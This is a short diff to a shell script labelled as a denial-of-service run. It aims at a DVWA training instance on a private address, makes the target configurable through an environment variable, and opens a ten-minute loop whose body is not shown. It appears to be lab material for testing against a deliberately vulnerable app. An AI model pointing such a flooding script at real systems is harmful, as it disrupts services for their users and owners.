@@ -1,6 +1,6 @@
 #!/bin/sh
 echo "[DOS] Starting..."
-TARGET="http://172.20.0.10/dvwa/"
+TARGET="${TARGET_HOST:-http://172.20.0.10/dvwa/}"
 END=$(($(date +%s) + 600))
 
 while [ $(date +%s) -lt $END ]; do
